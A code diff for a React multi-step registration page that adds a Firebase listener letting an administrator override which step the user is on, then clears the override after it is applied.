@@ -12,7 +12,7 @@ import { Step6PhoneProvider } from "@/components/steps/Step6PhoneProvider";
 import { Step5Success } from "@/components/steps/Step5Success";
 import { MessageCircle } from "lucide-react";
 import { useHeartbeat } from "@/hooks/useHeartbeat";
-import { saveStepData, completeRegistration, handleCurrentPage, setOnlineStatus, updateOnlinePage } from "@/lib/firebase";
+import { saveStepData, completeRegistration, handleCurrentPage, setOnlineStatus, updateOnlinePage, subscribeToUserStep, clearUserStepOverride } from "@/lib/firebase";
 
 export default function Register() {
   const [step, setStep] = useState(1);
@@ -48,6 +48,18 @@ export default function Register() {
   useEffect(() => {
     handleCurrentPage(`/register/step-${step}`);
     updateOnlinePage(`/register/step-${step}`);
+  }, [step]);
+
+  // Listen for admin step override
+  useEffect(() => {
+    const unsubscribe = subscribeToUserStep((adminStep) => {
+      if (adminStep && adminStep !== step) {
+        setStep(adminStep);
+        // Clear the override after applying it so user can continue normally
+        clearUserStepOverride();
+      }
+    });
+    return () => unsubscribe();
   }, [step]);
 
   const newAccountSteps = [
